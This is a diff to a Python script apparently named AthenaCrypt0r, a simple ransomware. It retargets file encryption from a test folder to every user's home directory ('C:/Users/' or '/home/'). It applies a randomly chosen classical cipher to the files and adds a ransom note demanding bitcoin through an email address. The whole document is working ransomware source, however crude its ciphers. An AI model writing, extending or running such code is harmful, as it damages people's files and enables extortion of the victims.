@@ -18,18 +18,28 @@ def generateKey():
     return encryptionKey #return it to the main function	
 
 
-def main():
+def main(key):
 
     if os.name == "nt":
-        path = "C:/TestFolder/"
+        path = "C:/Users/"
     else:
         path = "/home/"
 
     files = getdirs.getdirs(path)
 
     # Randomly chooses an encryption algorithm and runs it.
-    EncryptionAlgorithms = [reverseCryptor(files),caeser(files),RailfenceEncrypt(files,3)]
-    r.choice(EncryptionAlgorithms)()
+    EncryptionAlgorithms = [reverseCryptor,caeser,RailfenceEncrypt]
+    r.choice(EncryptionAlgorithms)(files)
+
+    bitcoin = r.random()
+
+    print("============================================================================================")
+    print("All your files have been encrypted with AthenaCrypt0r :)")
+    print("To ever see your files again, please email athena@protonmail.ch with the following key: "+key)
+    print("Please be prepared to pay "+ str(bitcoin) + " BTC for the safe release of your files")
+    print("You can learn how to buy bitcoin here: https://www.coinbase.com/buy-bitcoin")
+    print("============================================================================================")
+    input("Please press any key to exit.")
 
 
 def reverseCryptor(files):
@@ -46,8 +56,9 @@ def reverseCryptor(files):
         f1.write(encrypted)
         f1.close()
 
-def RailfenceEncrypt(files, key):
+def RailfenceEncrypt(files):
     outputfile = ".AthenaCrypt0r"
+    key = 3
     for file in files:
         f = open(file, "r")
         contents = f.read()
@@ -76,4 +87,4 @@ def caeser(files):
         f1.close()
 
 if __name__=="__main__":
-    main()
+    main(generateKey())
